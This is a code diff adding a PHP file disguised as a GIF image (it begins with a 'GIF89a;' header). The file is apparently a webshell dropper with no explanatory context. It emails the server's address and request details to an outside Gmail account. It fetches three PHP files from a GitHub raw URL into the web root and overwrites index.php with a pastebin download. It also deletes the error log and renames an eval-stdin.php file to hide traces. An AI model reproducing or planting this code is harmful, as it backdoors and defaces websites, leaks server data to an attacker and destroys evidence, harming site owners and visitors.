@@ -1,0 +1,66 @@
+GIF89a;
+<?php
+$ip = getenv("REMOTE_ADDR");
+$subj98 = " Tuyul |$ip";
+$email = "sitexploit@gmail.com";
+$from = "From: Result<Tuyul";
+$a45 = $_SERVER['REQUEST_URI'];
+$b75 = $_SERVER['HTTP_HOST'];
+$m22 = $ip . "";
+$msg8873 = "$m22 $b75 $a45";
+mail($email, $subj98, $msg8873, $from);
+?>
+<?php
+function http_get($url){
+$im = curl_init($url);
+curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($im, CURLOPT_HEADER, 0);
+return curl_exec($im);
+curl_close($im);
+}
+$check1 = $_SERVER['DOCUMENT_ROOT'] . "/pm.php" ;
+$text1 = http_get('https://raw.githubusercontent.com/boters/PythonBot/master/files/pm.txt');
+$open1 = fopen($check1, 'w');
+fwrite($open1, $text1);
+fclose($open1);
+if(file_exists($check1)){
+}
+$check2 = $_SERVER['DOCUMENT_ROOT'] . "/mar.php" ;
+$text2 = http_get('https://raw.githubusercontent.com/boters/PythonBot/master/files/mar.txt');
+$open2 = fopen($check2, 'w');
+fwrite($open2, $text2);
+fclose($open2);
+if(file_exists($check2)){
+}
+$check4 = $_SERVER['DOCUMENT_ROOT'] . "/s.php" ;
+$text4 = http_get('https://raw.githubusercontent.com/boters/PythonBot/master/files/s.txt');
+$open4 = fopen($check4, 'w');
+fwrite($open4, $text4);
+fclose($open4);
+if(file_exists($check4)){
+}
+<?php
+$fp = fopen ('index.php', 'w+');
+ 
+$url = "https://pastebin.com/raw/eqzujNLa";
+ 
+//Here is the file we are downloading, replace spaces with %20
+$ch = curl_init(str_replace(" ","%20",$url));
+ 
+curl_setopt($ch, CURLOPT_TIMEOUT, 50);
+ 
+//give curl the file pointer so that it can write to it
+curl_setopt($ch, CURLOPT_FILE, $fp);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+ 
+$data = curl_exec($ch);//get curl response
+ 
+//done
+curl_close($ch);
+?>
+<?php
+unlink("error_log");
+@system("mv eval-stdin.php 123makingoblokloasw.php");
+?>
